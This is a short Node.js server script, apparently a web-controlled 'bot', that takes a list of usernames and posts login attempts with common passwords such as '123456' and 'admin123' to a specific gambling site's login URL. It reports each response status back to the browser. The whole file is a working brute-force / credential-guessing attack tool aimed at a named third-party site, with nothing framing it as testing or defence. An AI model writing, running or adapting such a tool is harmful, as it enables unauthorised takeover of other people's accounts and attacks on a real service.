const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const fetch = require("node-fetch");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const loginUrl = "https://facai988.live/bd/en/account-login-quick";
const passwords = ["123456", "password", "admin123", "facai@2024", "test123"];
const attemptsPerUser = 3;

app.use(express.static(__dirname)); // serve index.html & assets

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

io.on("connection", (socket) => {
  console.log("A user connected");

  socket.on("startBot", async (usernames) => {
    for (const username of usernames) {
      if (!username) continue;

      for (let i = 0; i < attemptsPerUser; i++) {
        const password = passwords[Math.floor(Math.random() * passwords.length)];

        try {
          const res = await fetch(loginUrl, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
          });

          socket.emit("botLog", `[${username}] Attempt ${i + 1}: Status ${res.status}`);
        } catch (err) {
          socket.emit("botLog", `[${username}] Attempt ${i + 1}: ❌ Failed (${err.message})`);
        }

        await sleep(1500);
      }
    }
    socket.emit("botFinished");
  });

  socket.on("disconnect", () => {
    console.log("User disconnected");
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
